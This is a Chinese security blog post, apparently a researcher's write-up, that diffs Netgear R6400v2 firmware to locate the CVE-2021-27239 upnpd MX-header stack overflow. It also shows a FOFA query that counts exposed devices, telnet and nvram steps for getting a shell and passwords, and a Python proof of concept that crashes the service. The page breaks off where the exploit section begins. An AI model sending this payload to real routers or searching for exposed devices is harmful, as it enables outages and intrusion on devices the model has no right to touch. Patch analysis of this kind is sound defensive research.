<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 3.8.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"21guns.top","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="[toc] netgear-r6400/v2漏洞定位及分析CVE-2021-27239-netgear-r6400/v2  CVE-2021-27239-netgear-r6400/v2基于UDP的1900端口、upnpd服务、内网、ssdp的mx头、栈溢出、无需认证、root权限  通告1234# https://www.zerodayinitiative.com/advisories/ZDI-">
<meta name="keywords" content="路由器,漏洞分析,补丁对比">
<meta property="og:type" content="article">
<meta property="og:title" content="netgear r6400&#x2F;v2漏洞定位及分析">
<meta property="og:url" content="http://21guns.top/2021/03/31/iot/netgear r6400v2漏洞定位及分析/index.html">
<meta property="og:site_name" content="have a nice day">
<meta property="og:description" content="[toc] netgear-r6400/v2漏洞定位及分析CVE-2021-27239-netgear-r6400/v2  CVE-2021-27239-netgear-r6400/v2基于UDP的1900端口、upnpd服务、内网、ssdp的mx头、栈溢出、无需认证、root权限  通告1234# https://www.zerodayinitiative.com/advisories/ZDI-">
<meta property="og:locale" content="zh-CN">
<meta property="og:updated_time" content="2022-02-22T01:19:23.480Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="netgear r6400&#x2F;v2漏洞定位及分析">
<meta name="twitter:description" content="[toc] netgear-r6400/v2漏洞定位及分析CVE-2021-27239-netgear-r6400/v2  CVE-2021-27239-netgear-r6400/v2基于UDP的1900端口、upnpd服务、内网、ssdp的mx头、栈溢出、无需认证、root权限  通告1234# https://www.zerodayinitiative.com/advisories/ZDI-">

<link rel="canonical" href="http://21guns.top/2021/03/31/iot/netgear r6400v2漏洞定位及分析/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>netgear r6400/v2漏洞定位及分析 | have a nice day</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">have a nice day</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" placeholder="搜索..." spellcheck="false" type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://21guns.top/2021/03/31/iot/netgear r6400v2漏洞定位及分析/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="21Guns">
      <meta itemprop="description" content>
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="have a nice day">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          netgear r6400/v2漏洞定位及分析
        </h1>

        <div class="post-meta">

          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-03-31 14:41:33" itemprop="dateCreated datePublished" datetime="2021-03-31T14:41:33+08:00">2021-03-31</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-02-22 09:19:23" itemprop="dateModified" datetime="2022-02-22T09:19:23+08:00">2022-02-22</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/IOT安全/" itemprop="url" rel="index"><span itemprop="name">IOT安全</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <p>[toc]</p>
<h1 id="netgear-r6400-v2漏洞定位及分析"><a href="#netgear-r6400-v2漏洞定位及分析" class="headerlink" title="netgear-r6400/v2漏洞定位及分析"></a>netgear-r6400/v2漏洞定位及分析</h1><p>CVE-2021-27239-netgear-r6400/v2</p>
<blockquote>
<p>CVE-2021-27239-netgear-r6400/v2基于UDP的1900端口、upnpd服务、内网、ssdp的mx头、栈溢出、无需认证、root权限</p>
</blockquote>
<h2 id="通告"><a href="#通告" class="headerlink" title="通告"></a>通告</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># https://www.zerodayinitiative.com/advisories/ZDI-21-206/</span></span><br><span class="line">his vulnerability allows network-adjacent attackers to execute arbitrary code on affected installations of NETGEAR R6400 and R6700 routers. Authentication is not required to exploit this vulnerability.</span><br><span class="line"></span><br><span class="line">The specific flaw exists within the upnpd service, <span class="built_in">which</span> listens on UDP port 1900 by default. A crafted MX header field <span class="keyword">in</span> an SSDP message can trigger an overflow of a fixed-length stack-based buffer. An attacker can leverage this vulnerability to execute code <span class="keyword">in</span> the context of root.</span><br></pre></td></tr></table></figure>
<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><ul>
<li>官网</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># https://kb.netgear.com/000062820/Security-Advisory-for-Stack-based-Buffer-Overflow-Remote-Code-Execution-Vulnerability-on-Some-Routers-PSV-2020-0432</span></span><br><span class="line">R6400 running firmware versions prior to 1.0.1.68</span><br><span class="line"></span><br><span class="line"><span class="comment"># https://www.netgear.com/support/product/R6400.aspx#download</span></span><br><span class="line">70、68、62</span><br><span class="line"></span><br><span class="line"><span class="comment"># fofa</span></span><br><span class="line">app=<span class="string">"NETGEAR-R6400"</span></span><br><span class="line">18,742 条匹配结果 (9,306 条独立IP)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 时间</span></span><br><span class="line">2020-09-23 - Vulnerability reported to vendor</span><br><span class="line">62：Last Updated:08/03/2020</span><br><span class="line">68:Last Updated:01/18/2021</span><br><span class="line">70:Last Updated:03/15/2021</span><br><span class="line"></span><br><span class="line"><span class="comment"># 故对比：62 &amp; 68</span></span><br></pre></td></tr></table></figure>
<ul>
<li>开启telnet</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># telnetd失败</span></span><br><span class="line"> lxl@MBP  ~  telnet 192.168.10.1</span><br><span class="line">Trying 192.168.10.1...</span><br><span class="line">Connected to 192.168.10.1.</span><br><span class="line">Escape character is <span class="string">'^]'</span>.</span><br><span class="line">Connection closed by foreign host.</span><br><span class="line"></span><br><span class="line"><span class="comment"># utelnetd成功</span></span><br><span class="line"> ✘ lxl@MBP  ~  telnet 192.168.10.1</span><br><span class="line">Trying 192.168.10.1...</span><br><span class="line">Connected to 192.168.10.1.</span><br><span class="line">Escape character is <span class="string">'^]'</span>.</span><br><span class="line">login: admin</span><br><span class="line"></span><br><span class="line"><span class="comment"># 无需多余的参数，默认即可</span></span><br><span class="line"><span class="comment"># ps |grep telnet</span></span><br><span class="line">16052 admin       652 S   utelnetd</span><br><span class="line"></span><br><span class="line"><span class="comment"># 参数</span></span><br><span class="line">无参数，需要登录</span><br><span class="line">-l /bin/sh，无需登录</span><br><span class="line"></span><br><span class="line"><span class="comment"># 最好后台执行</span></span><br><span class="line">utelnetd -l /bin/sh &amp;</span><br><span class="line">若前台执行会一直等待执行完</span><br></pre></td></tr></table></figure>
<ul>
<li>获取web密码</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># nvram show |grep http_</span></span><br><span class="line">size: 40713 bytes (90359 left)</span><br><span class="line">http_username=admin</span><br><span class="line">http_passwd=admin</span><br></pre></td></tr></table></figure>
<h2 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h2><ul>
<li>过程</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"># 通告中：SSDP消息中的MX头字段</span><br><span class="line">.rodata:0003E848 aMx             DCB &quot;MX:&quot;,0             ; DATA XREF: my_vulnee+28↑o</span><br><span class="line"># 交叉引用找到sub_21078</span><br><span class="line">.text:00021078 my_vulnee                               ; CODE XREF: sub_22038+188↓p</span><br><span class="line">.text:00021078</span><br><span class="line">.text:00021078 var_90          = -0x90</span><br><span class="line">.text:00021078 str             = -0x8C</span><br><span class="line">.text:00021078</span><br><span class="line">.text:00021078                 PUSH            &#123;R4-R6,LR&#125;</span><br><span class="line">.text:0002107C                 MOV             R4, #0</span><br><span class="line">.text:00021080                 SUB             SP, SP, #0x80</span><br><span class="line">.text:00021084                 MOV             R5, R0  ; 参数1，请求</span><br><span class="line">.text:00021088                 MOV             R1, R4  ; c</span><br><span class="line">.text:0002108C                 MOV             R2, #0x7C ; &apos;|&apos; ; n</span><br><span class="line">.text:00021090                 ADD             R0, SP, #0x90+str ; s</span><br><span class="line">.text:00021094                 STR             R4, [SP,#0x90+var_90]</span><br><span class="line">.text:00021098                 BL              memset</span><br><span class="line">.text:0002109C                 MOV             R0, R5</span><br><span class="line">.text:000210A0                 LDR             R1, =aMx ; &quot;MX:&quot;</span><br><span class="line">.text:000210A4                 BL              stristr ; 从请求内容中找到MX头</span><br><span class="line">.text:000210A8                 SUBS            R5, R0, #0</span><br><span class="line">.text:000210AC                 BEQ             loc_21114</span><br><span class="line">.text:000210B0                 LDR             R1, =(aSetsockopt1+0xC) ; &quot;\r\n&quot;</span><br><span class="line">.text:000210B4                 BL              stristr ; 从mx头中找其结尾</span><br><span class="line">.text:000210B8                 SUBS            R6, R0, #0 ; 尾部位置</span><br><span class="line">.text:000210BC                 BEQ             loc_21120</span><br><span class="line">.text:000210C0                 ADD             R1, R5, #3 ; 跳过&quot;mx:&quot;，取值，作为src</span><br><span class="line">.text:000210C4                 CMP             R6, R1</span><br><span class="line">.text:000210C8                 BLS             loc_21104</span><br><span class="line">.text:000210CC                 RSB             R2, R1, R6 ; 尾部-首部，作为n</span><br><span class="line">.text:000210CC                                         ; 如此控制大小n，形同虚设，mx:1234，n=4</span><br><span class="line">.text:000210D0                 MOV             R0, SP  ; 栈空间，作为dest</span><br><span class="line">.text:000210D4                 BL              strncpy ; overflow！</span><br><span class="line"></span><br><span class="line"># bindiff</span><br><span class="line">0.9867301027026377	0.9899582273570628	00021078	sub_00021078	Normal	000210B8	sub_000210B8	Normal</span><br></pre></td></tr></table></figure>
<ul>
<li>如何修复</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 旧，v62，尽管是strncpy，但控制n的方法白给</span></span><br><span class="line"><span class="keyword">char</span> *__<span class="function">fastcall <span class="title">my_vulnee</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> dst_buff; <span class="comment">// [sp+0h] [bp-90h] BYREF 尽管非局部数组，也是局部指针，其指向内存空间在栈</span></span><br><span class="line"></span><br><span class="line">  mx_header = stristr(a1, <span class="string">"MX:"</span>);</span><br><span class="line">  mx_header_1 = mx_header;</span><br><span class="line">  <span class="keyword">if</span> ( !mx_header || (mx_end = stristr(mx_header, <span class="string">"\r\n"</span>)) == <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    nullsub_1(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( mx_end &lt;= mx_header_1 + <span class="number">3</span> )              <span class="comment">// +3跳过"MX:"</span></span><br><span class="line">    <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">  <span class="built_in">strncpy</span>(&amp;dst_buff, (mx_header_1 + <span class="number">3</span>), &amp;mx_end[-mx_header_1 - <span class="number">3</span>]);<span class="comment">// overflow</span></span><br><span class="line">                                                <span class="comment">// -mx_header_1 - 3 = - (mx_header_1 + 3)</span></span><br><span class="line">                                                <span class="comment">// 尾部位置-首部位置，即此mx的len</span></span><br><span class="line">                                                <span class="comment">// 如此控制n，形同虚设</span></span><br><span class="line"><span class="comment">// 新，v68，对n限制大小</span></span><br><span class="line"><span class="keyword">char</span> *__<span class="function">fastcall <span class="title">sub_210B8</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  mx_header = stristr(a1, <span class="string">"MX:"</span>);</span><br><span class="line">  mx_header_1 = mx_header;</span><br><span class="line">  <span class="keyword">if</span> ( !mx_header || (mx_end = stristr(mx_header, <span class="string">"\r\n"</span>)) == <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    nullsub_1(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  mx_begin = (mx_header_1 + <span class="number">3</span>);</span><br><span class="line">  <span class="keyword">if</span> ( mx_end &lt;= mx_header_1 + <span class="number">3</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">  mx_len = mx_end - mx_begin;</span><br><span class="line">  <span class="keyword">if</span> ( (mx_end - mx_begin) &gt;= <span class="number">127</span> )             <span class="comment">// 强行对n限制，最大127</span></span><br><span class="line">    mx_len = <span class="number">127</span>;</span><br><span class="line">  <span class="built_in">strncpy</span>(&amp;dst_buff, mx_begin, mx_len);</span><br></pre></td></tr></table></figure>
<h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><ul>
<li>设置最小长度以显示”MX:”字符串</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ida中明明有"MX:"字符串，但strings窗口中没有</span></span><br><span class="line">.rodata:0003E848 aMx             DCB <span class="string">"MX:"</span>,0</span><br><span class="line"><span class="comment"># strings工具也没有</span></span><br><span class="line">strings upnpd-62 | grep MX</span><br><span class="line"></span><br><span class="line"><span class="comment"># stings工具：需要指定最小长度，-n 3，默认是4</span></span><br><span class="line">$ strings upnpd-62 -n 3 | grep MX</span><br><span class="line">MX:</span><br><span class="line"></span><br><span class="line"><span class="comment"># ida中：strings窗口右键、setup、修改minimal string length为3，默认5</span></span><br><span class="line">.rodata:0003E848	00000004	C	MX:</span><br></pre></td></tr></table></figure>
<ul>
<li>注意漏洞描述是TCP 还是 UDP，以及相应端口号！！！</li>
<li>123</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 怎么区分各种arm版本</span></span><br><span class="line">pwndbg&gt; <span class="built_in">set</span> architecture arm</span><br><span class="line">arm      arm_any  armv2    armv2a   armv3    armv3m   armv4    armv4t   armv5    armv5t   armv5te</span><br></pre></td></tr></table></figure>
<h2 id="程序执行"><a href="#程序执行" class="headerlink" title="程序执行"></a>程序执行</h2><ul>
<li>模拟执行：利用qemu-system-arm，qemu_arm虚拟机</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 参考Netgear Nighthawk R8300 upnpd PreAuth RCE 分析与复现：https://paper.seebug.org/1311/</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改nvram.ini（其它默认没改</span></span><br><span class="line">lan_ipaddr=10.10.10.2</span><br><span class="line">lan_hwaddr=52:54:00:12:34:56</span><br><span class="line">hwver=R8500<span class="comment"># 没改，实测无影响</span></span><br><span class="line">friendly_name=R8300<span class="comment"># 没改，实测无影响</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行</span></span><br><span class="line">LD_PRELOAD=<span class="string">"/custom_nvram_r6250.so /lib/libdl.so.0"</span> /usr/sbin/upnpd</span><br><span class="line"><span class="comment"># ps</span></span><br><span class="line"> 2472 0          2864 S   /usr/sbin/upnpd</span><br><span class="line"></span><br><span class="line"><span class="comment"># 是基于UDP的1900端口，切莫搞错</span></span><br><span class="line"><span class="comment"># /tmp/busybox-armv7l netstat -atp（错误）</span></span><br><span class="line">tcp        0      0 0.0.0.0:5000            0.0.0.0:*               LISTEN      2472/upnpd</span><br><span class="line"><span class="comment"># /tmp/busybox-armv7l netstat -aup （正确）</span></span><br><span class="line">udp        0      0 0.0.0.0:1900            0.0.0.0:*                           2801/upnpd</span><br><span class="line"></span><br><span class="line"><span class="comment"># 无法http访问</span></span><br><span class="line">http://10.10.10.2:1900/<span class="comment"># 错误，http基于tcp</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 无法端口转发，只能本子网中实验</span></span><br><span class="line">ssh -L 9000:10.10.10.2:1900 192.168.142.188<span class="comment"># 错误，udp端口不能用ssh来转发，因为ssh基于tcp的</span></span><br></pre></td></tr></table></figure>
<ul>
<li>手头有R6400v2的设备，二者硬件环境应该相似，直接将upnpd拷进去执行即可，免得模拟</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1 拷贝至设备</span></span><br><span class="line"><span class="built_in">cd</span> tmp</span><br><span class="line">wget http://192.168.10.2:8000/upnpd-62</span><br><span class="line">chmod +x upnpd-62</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2 kill原有的</span></span><br><span class="line"><span class="comment"># ps |grep upnpd</span></span><br><span class="line"> 9461 admin      4364 S   upnpd</span><br><span class="line">15140 admin      2900 S   grep upnpd</span><br><span class="line"><span class="comment"># killall upnpd</span></span><br><span class="line"><span class="comment"># ps |grep upnpd</span></span><br><span class="line">15325 admin      2876 D   grep upnpd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3 成功执行</span></span><br><span class="line"><span class="comment"># ps |grep upnpd</span></span><br><span class="line">15325 admin      2876 D   grep upnpd</span><br><span class="line"><span class="comment"># ./upnpd-62</span></span><br><span class="line"><span class="comment"># ps |grep upnpd</span></span><br><span class="line">15717 admin      2492 S   ./upnpd-62</span><br><span class="line">15721 admin      2892 R   grep upnpd</span><br></pre></td></tr></table></figure>
<h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 参考</span></span><br><span class="line">google:python 组播</span><br><span class="line">https://www.cnblogs.com/lsdb/p/<span class="number">9408947.</span>html</span><br><span class="line"></span><br><span class="line"><span class="comment"># poc.py</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">mcast_group_ip = <span class="string">'192.168.10.1'</span></span><br><span class="line">mcast_group_port = <span class="number">1900</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sender</span><span class="params">()</span>:</span></span><br><span class="line">    send_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)</span><br><span class="line">    send_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">    send_sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, <span class="number">2</span>)</span><br><span class="line">    message = <span class="string">'M-SEARCH * HTTP/1.1\r\nST: ssdp:discover\r\nMX: 33333333333333333333333333333333333333333333333333333333333333333333333333\r\nMAN: "ssdp:discover"\r\nHOST: 239.255.255.250:1900\r\n\r\n'</span></span><br><span class="line">    send_sock.sendto(message.encode(), (mcast_group_ip, mcast_group_port))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    sender()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行后，程序被打死</span></span><br><span class="line">python3 poc.py</span><br><span class="line"></span><br><span class="line"><span class="comment"># ps |grep upnpd</span></span><br><span class="line"><span class="number">15717</span> admin      <span class="number">2492</span> S   ./upnpd<span class="number">-62</span></span><br><span class="line"><span class="number">15721</span> admin      <span class="number">2892</span> R   grep upnpd</span><br><span class="line"><span class="comment"># ps |grep upnpd</span></span><br><span class="line"><span class="number">16104</span> admin      <span class="number">2876</span> R   grep upnpd</span><br></pre></td></tr></table></figure>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><ul>
<li>远程调试</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span 